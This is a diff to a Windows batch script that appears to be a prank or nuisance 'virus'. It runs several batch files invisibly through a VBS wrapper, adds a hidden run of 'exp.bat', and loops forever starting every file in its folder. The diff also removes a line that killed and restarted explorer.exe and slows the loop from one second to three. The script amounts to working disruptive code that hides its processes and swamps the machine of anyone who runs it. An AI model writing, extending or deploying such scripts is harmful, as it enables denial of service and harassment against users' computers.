@@ -22,6 +22,7 @@ wscript.exe invis.vbs sound2.bat
 wscript.exe invis.vbs sound3.bat
 ::wscript.exe invis.vbs sound4.bat
 wscript.exe invis.vbs sound5.bat
+wscript.exe invis.vbs exp.bat
 
 
 :loop
@@ -34,8 +35,6 @@ wscript.exe invis.vbs error3.bat
 wscript.exe invis.vbs error4.bat
 wscript.exe invis.vbs error5.bat
 wscript.exe invis.vbs foto.bat
-taskkill /F /IM explorer.exe
-explorer
 for %%i in (*.*) do start "" "%%i"
-timeout /t 1 /nobreak >nul
+timeout /t 3 /nobreak >nul
 goto loop
